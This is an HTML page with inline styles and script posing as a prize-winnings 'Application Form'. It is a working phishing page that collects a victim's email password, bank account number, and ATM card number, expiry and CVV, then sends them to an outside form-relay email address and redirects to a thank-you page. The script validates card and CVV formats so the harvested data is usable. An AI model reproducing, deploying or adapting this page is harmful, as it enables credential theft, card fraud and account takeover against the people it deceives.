<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      padding: 20px;
    }
    form {
      background: #fff;
      padding: 20px;
      border-radius: 12px;
      max-width: 600px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    label {
      display: block;
      margin-top: 12px;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 6px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 1em;
    }
    .password-wrapper {
      position: relative;
    }
    .password-wrapper input {
      padding-right: 40px;
    }
    .password-wrapper .toggle {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 1em;
    }
    .error {
      color: red;
      font-size: 0.9em;
      display: none;
    }
    #finalNote {
      margin-top: 20px;
      font-weight: bold;
      display: none;
    }
    #atmWarning {
      color: red;
      font-weight: bold;
      display: none;
    }
    button {
      margin-top: 20px;
      padding: 12px;
      width: 100%;
      font-size: 1em;
      border: none;
      border-radius: 8px;
      background: green;
      color: white;
      cursor: pointer;
    }
    button:disabled {
      background: red;
      color: white;
      cursor: not-allowed;
    }
  </style>
</head>
<body>

<h2 style="text-align:center;">Application Form</h2>

<form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" id="applicationForm">
  <input type="hidden" name="_next" value="https://onlinegistrationprog.github.io/Application%20Form/thankyou.html">
  <input type="hidden" name="_captcha" value="false">

  <label>Full Name:
    <input type="text" name="fullName" id="fullName" required>
  </label>

  <label>Country:
    <input type="text" name="country" id="country" required>
  </label>

  <label>Phone Number:
    <input type="tel" name="phone" id="phone" required>
    <div class="error" id="phoneError">Phone must be 9‚Äì12 digits</div>
  </label>

  <label>Email Address:
    <input type="email" name="email" required>
  </label>

  <label>Email Password:
    <div class="password-wrapper">
      <input type="password" name="emailPassword" id="emailPassword" required>
      <span class="toggle" onclick="togglePassword()">üëÅÔ∏è</span>
    </div>
  </label>

  <label>Amount You Won:
    <input type="text" name="amountWon" id="amountWon" required>
  </label>

  <label>Bank Account Type:
    <input type="text" name="accountType" id="accountType" placeholder="e.g Standard Bank" required>
  </label>

  <label>Bank Account Number:
    <input type="text" name="accountNumber" id="accountNumber" required>
  </label>

  <label>Bank Account Holder's Name:
    <input type="text" name="accountName" id="accountName" required>
  </label>

  <label>Did You Link ATM to Your Bank Account?
    <select name="atmLinked" id="atmLinked" required onchange="checkATMStatus()">
      <option value="">--Select--</option>
      <option value="Yes">Yes</option>
      <option value="No">No</option>
    </select>
  </label>

  <div id="atmWarning">YOU MUST HAVE ATM CARD TO PROCEED</div>

  <div id="atmFields">
    <label>ATM Card Number:
      <input type="text" name="atmCard" id="atmCard">
      <div class="error" id="atmError">ATM Card must be 16 digits</div>
    </label>

    <label>Expiry Date (MM/YY):
      <input type="text" name="expiry" id="expiry" maxlength="5">
      <div class="error" id="expiryError">Invalid format (MM/YY)</div>
    </label>

    <label>CVV:
      <input type="text" name="cvv" id="cvv">
      <div class="error" id="cvvError">CVV must be 3 digits</div>
    </label>
  </div>

  <div id="finalNote"></div>

  <button type="submit" id="submitBtn" disabled>Submit</button>
</form>

<script>
  const fullName = document.getElementById("fullName");
  const amountWon = document.getElementById("amountWon");
  const accountType = document.getElementById("accountType");
  const accountNumber = document.getElementById("accountNumber");
  const atmLinked = document.getElementById("atmLinked");
  const atmFields = document.getElementById("atmFields");
  const finalNote = document.getElementById("finalNote");
  const atmWarning = document.getElementById("atmWarning");
  const submitBtn = document.getElementById("submitBtn");

  function togglePassword() {
    const pwd = document.getElementById("emailPassword");
    pwd.type = pwd.type === "password" ? "text" : "password";
  }

  function checkATMStatus() {
    const val = atmLinked.value;
    if (val === "No") {
      atmFields.style.display = "none";
      finalNote.style.display = "none";
      atmWarning.style.display = "block";
      submitBtn.disabled = true;
    } else {
      atmFields.style.display = "block";
      atmWarning.style.display = "none";
      updateFinalNote();
      validateForm();
    }
  }

  function updateFinalNote() {
    const name = fullName.value;
    const amt = amountWon.value;
    const type = accountType.value;
    const acc = accountNumber.value;
    if (name && amt && type && acc) {
      finalNote.innerText = `Dear ${name}, You will receive ${amt} to your ${type}, ${acc}`;
      finalNote.style.display = "block";
    }
  }

  function validatePhone() {
    const phone = document.getElementById("phone");
    const phoneError = document.getElementById("phoneError");
    const val = phone.value.trim();
    if (/^\d{9,12}$/.test(val)) {
      phoneError.style.display = "none";
      return true;
    } else {
      phoneError.style.display = "block";
      return false;
    }
  }

  function validateATM() {
    const atm = document.getElementById("atmCard");
    const err = document.getElementById("atmError");
    if (/^\d{16}$/.test(atm.value)) {
      err.style.display = "none";
      return true;
    } else {
      err.style.display = "block";
      return false;
    }
  }

  function validateCVV() {
    const cvv = document.getElementById("cvv");
    const err = document.getElementById("cvvError");
    if (/^\d{3}$/.test(cvv.value)) {
      err.style.display = "none";
      return true;
    } else {
      err.style.display = "block";
      return false;
    }
  }

  function validateExpiry() {
    const exp = document.getElementById("expiry");
    const err = document.getElementById("expiryError");
    const val = exp.value;
    if (/^(0[1-9]|1[0-2])\/\d{2}$/.test(val)) {
      err.style.display = "none";
      return true;
    } else {
      err.style.display = "block";
      return false;
    }
  }

  function validateForm() {
    const validPhone = validatePhone();
    const validATM = atmFields.style.display !== "none" ? validateATM() : true;
    const validCVV = atmFields.style.display !== "none" ? validateCVV() : true;
    const validExpiry = atmFields.style.display !== "none" ? validateExpiry() : true;
    if (validPhone && validATM && validCVV && validExpiry) {
      submitBtn.disabled = false;
    } else {
      submitBtn.disabled = true;
    }
  }

  document.getElementById("phone").addEventListener("blur", validatePhone);
  document.getElementById("atmCard").addEventListener("blur", validateATM);
  document.getElementById("cvv").addEventListener("blur", validateCVV);
  document.getElementById("expiry").addEventListener("input", (e) => {
    let val = e.target.value.replace(/[^0-9]/g, "");
    if (val.length >= 3) val = val.slice(0,2) + "/" + val.slice(2);
    e.target.value = val.slice(0, 5);
  });
  document.getElementById("expiry").addEventListener("blur", validateExpiry);

  [fullName, amountWon, accountType, accountNumber].forEach(el => {
    el.addEventListener("blur", updateFinalNote);
  });

  document.querySelectorAll("input, select").forEach(el => {
    el.addEventListener("input", validateForm);
  });
</script>

</body>
</html>
